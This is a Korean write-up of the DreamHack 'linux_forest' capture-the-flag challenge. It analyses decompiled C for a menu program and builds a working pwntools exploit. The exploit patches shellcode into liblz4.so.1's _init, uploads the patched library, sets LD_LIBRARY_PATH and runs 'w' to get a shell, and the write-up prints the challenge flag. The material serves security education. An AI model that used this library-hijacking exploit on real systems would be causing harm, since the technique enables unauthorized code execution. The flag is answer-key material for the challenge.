# [DreamHack] linux_forest

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 학습한 Logical Bugs를 실습할 수 있는 리눅스 숲에 오신 것을 환영합니다!
> 리눅스 숲에서 취약점을 찾아 플래그를 획득하세요!
>
> Release: [linux_forest.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8555105/linux_forest.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/162686763-185f598b-507e-4a55-a3c8-78c780d49c9d.png)

## Analysis

### 1. Execute a command

`1. Execute a command`를 선택하면 `sub_23e2()`(`execute_cmd()`)가 호출된다.

```c
  if ( std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length(command_input) == 1 )
  {
    if ( string_compare_1((__int64)command_input, (__int64)"p") )
    {
      if ( (unsigned __int8)string_compare_0((__int64)&tmpdir_name, (__int64)&unk_581E) )
      {
        v3 = std::operator<<<char>(&std::cout, &tmpdir_name);
        std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
        std::allocator<char>::allocator(&v6);
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(
          v9,
          "ls -al -- ",
          &v6);
        string_append((__int64)v8, (__int64)v9, (__int64)&tmpdir_name);
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(command_input, v8);
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v8);
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v9);
        std::allocator<char>::~allocator(&v6);
      }
    }
    else if ( string_compare_1((__int64)command_input, (__int64)"i") )
    {
      std::allocator<char>::allocator(&v6);
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(v9, "id", &v6);
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(command_input, v9);
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v9);
      std::allocator<char>::~allocator(&v6);
    }
    command = (const char *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(command_input);
    system(command);
  }
  else
  {
    error((__int64)"try 'w'.");
  }
```

`execute_cmd()`에서는 커맨드를 입력받고, 그 커맨드에 따라 다른 결과를 출력한다.

- `"p"`를 입력하면
  - Temp directory를 만들었을 경우 `system("ls -al -- tmpdir")`을 호출한다.
  - Temp directory를 만들지 않았을 경우 `system("p")`를 호출한다.

- `"i"`를 입력하면 `system("id")`를 호출한다.
- `"i"`가 아닌 한 글자 커맨드를 입력하면 그 커맨드를 `system(command)`로 실행한다.
- 한 글자가 아닌 커맨드를 입력하면 `"try 'w'"`를 출력한다.

### 2. Manage environments

`2. Manage environments`를 선택하면 `sub_2688()`(`manage_env()`)을 호출한다. `manage_env()`에는 `1. get`과 `2. set` 두 가지 메뉴가 있다.

```c
    if ( choice == 1 )
    {
      read_string((__int64)v14);
      v0 = (const char *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(v14);
      v1 = getenv(v0);
      v2 = std::operator<<<std::char_traits<char>>(&std::cout, v1);
      std::ostream::operator<<(v2, &std::endl<char,std::char_traits<char>>);
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v14);
    }
```

`1. get`을 선택하면 환경 변수 이름을 입력해서 그 환경 변수의 값을 출력한다.

```c
    else
    {
      read_string((__int64)_env_name);
      if ( (unsigned __int8)filter((__int64)_env_name, (__int64)&unk_9080)// name can't be "PATH" or "LD_PRELOAD"
        || (unsigned __int8)only_alphabet((__int64)_env_name) != 1 )// name should be composed of alphabets, '-', '_'
      {
        string_append((__int64)_env_value, (__int64)_env_name, (__int64)" is a banned keyword.");
        error((int)_env_value, (int)_env_name, v4);
      }
      else
      {
        read_string((__int64)_env_value);
        v5 = (const char *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(_env_value);
        v6 = (const char *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(_env_name);
        setenv(v6, v5, 1);
        v7 = std::operator<<<char>(&std::cout, _env_name);
        v8 = std::operator<<<std::char_traits<char>>(v7, "=");
        v9 = (const char *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(_env_name);
        v10 = getenv(v9);
        v11 = std::operator<<<std::char_traits<char>>(v8, v10);
        std::ostream::operator<<(v11, &std::endl<char,std::char_traits<char>>);
      }
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(_env_value);
      std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(_env_name);
    }
```

`2. set`을 선택하면 원하는 환경 변수를 원하는 값으로 설정할 수 있다. 환경 변수의 이름은 알파벳과 `'-'`, `'_'`만으로 이루어져야 하고, `"PATH"`와 `"LD_PRELOAD"`는 될 수 없다.

### 3. Create a temp directory

```c
unsigned __int64 create_tmpdir()
{
  char *v0; // rax
  __int64 v1; // rbx
  __int64 v2; // rax
  char v4; // [rsp+Fh] [rbp-61h] BYREF
  char templatea[32]; // [rsp+10h] [rbp-60h] BYREF
  char v6[40]; // [rsp+30h] [rbp-40h] BYREF
  unsigned __int64 v7; // [rsp+58h] [rbp-18h]

  v7 = __readfsqword(0x28u);
  strcpy(templatea, "/tmp/dreamhack.XXXXXX");
  std::allocator<char>::allocator(&v4);
  v0 = mkdtemp(templatea);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(v6, v0, &v4);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(&tmpdir_name, v6);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v6);
  std::allocator<char>::~allocator(&v4);
  v1 = std::operator<<<std::char_traits<char>>(&std::cout, "Your personal directory is: ");
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(v6, &tmpdir_name);
  v2 = std::operator<<<char>(v1, v6);
  std::ostream::operator<<(v2, &std::endl<char,std::char_traits<char>>);
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v6);
  return __readfsqword(0x28u) ^ v7;
}
```

`"/tmp/dreamhack.XXXXXX"` 형식의 디렉토리를 만들고 디렉토리 이름을 출력해준다.

### 4. Write a file to temp directory

```c
  if ( string_compare_1((__int64)&tmpdir_name, (__int64)&unk_581E) )
  {
    error((__int64)"You must create a temp directory first.");
  }
```

Temp directory를 만들지 않았을 경우 에러를 낸다.

```c
    std::operator<<<std::char_traits<char>>(&std::cout, "File name: ");
    read_string((__int64)filename);
    if ( std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::find(filename, "..", 0LL) != -1
      || std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::find(filename, "/", 0LL) != -1 )
    {
      error((__int64)"Bad characters in the file name.");
    }
```

파일 이름을 입력받는데, 파일 이름에 `".."`나 `"/"`가 포함되어 있으면 에러를 낸다.

```c
      std::operator<<<std::char_traits<char>>(&std::cout, "File data (base64 encoded): ");
      read_string((__int64)file_data);
      if ( (unsigned __int64)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::length(file_data) <= 200000 )
      {
        b64decode(decoded_data, file_data);
        std::ofstream::basic_ofstream(v9);
        string_append((__int64)v7, (__int64)&tmpdir_name, (__int64)"/");
        string_append((__int64)v8, (__int64)v7, (__int64)filename);
        std::ofstream::open(v9, v8, 4LL);
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v8);
        std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string(v7);
        v1 = sub_3516(decoded_data);
        v2 = (const char *)sub_34F6(decoded_data, 0LL);
        std::ostream::write((std::ostream *)v9, v2, v1);
        std::ofstream::~ofstream(v9);
        sub_3440(decoded_data);
      }
      else
      {
        error((__int64)"Too long..");
      }
```

파일 내용을 base64로 인코딩해서 200000바이트까지 입력할 수 있다. 파일은 이전에 만든 temp directory에 저장된다.

## Exploit

`LD_LIBRARY_PATH` 환경 변수를 temp directory로 설정하면 라이브러리를 로드할 때 바이너리에 설정된 경로보다 temp directory에서 먼저 찾는다. `execute_cmd()`에서 `w` 명령어를 실행할 수 있으므로, `w`가 로드하는 라이브러리들 중 하나를 바꿔치기해서, 원래 호출되는 함수 대신 `system("/bin/sh")`가 호출되도록 만들면 셸을 획득할 수 있다.

### Modify liblz4.so.1.7.1

![image](https://user-images.githubusercontent.com/102066383/163221172-3239f5fd-8a6e-4061-bc63-ddbe19400db9.png)

`w`는 `liblz4.so.1`의 `_init()`을 가장 먼저 호출한다. `_init()` 부분을 셸코드로 덮어쓰면 된다.

```python
# modify liblz4.so.1.7.1

f = open('./liblz4.so.1.7.1', 'rb')
lib = f.read()
f.close()

shellcode = asm(shellcraft.sh())
offset = 0x1cf8 # offset of _init()

modified_lib = lib[:offset]
modified_lib += shellcode
modified_lib += lib[offset + len(shellcode):]
```

### Get shell

```python
# get shell

tmpdir = create_tmpdir()
write_file('liblz4.so.1', modified_lib)
set_env('LD_LIBRARY_PATH', tmpdir)
execute_cmd('w')
```

### Full exploit

```python
from pwn import *
from base64 import b64encode
context(arch='amd64')

REMOTE = True

if not REMOTE:
    r = process('./release/public/main')
else:
    r = remote('host1.dreamhack.games', 15488)

sla = r.sendlineafter
sa = r.sendafter

def execute_cmd(cmd):
    sla('> ', '1')
    sla('i. id\n', cmd)

def set_env(name, value):
    sla('> ', '2')
    sla('> ', '2')
    r.sendline(name)
    r.sendline(value)

def create_tmpdir():
    sla('> ', '3')
    r.recvuntil('Your personal directory is: ')
    return r.recvline()[:-1]

def write_file(name, data):
    sla('> ', '4')
    sla('File name: ', name)
    sla('File data (base64 encoded): ', b64encode(data))


# modify liblz4.so.1.7.1

f = open('./liblz4.so.1.7.1', 'rb')
lib = f.read()
f.close()

shellcode = asm(shellcraft.sh())
offset = 0x1cf8  # offset of _init()

modified_lib = lib[:offset]
modified_lib += shellcode
modified_lib += lib[offset + len(shellcode):]


# get shell

tmpdir = create_tmpdir()
write_file('liblz4.so.1', modified_lib)
set_env('LD_LIBRARY_PATH', tmpdir)
execute_cmd('w')


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 15488: Done
[*] Switching to interactive mode
$ cat flag
DH{292befb7a6e85bacf55c4644f6f1859fbe6184f4be34f6f43cecef0bd31b4dd4}
```
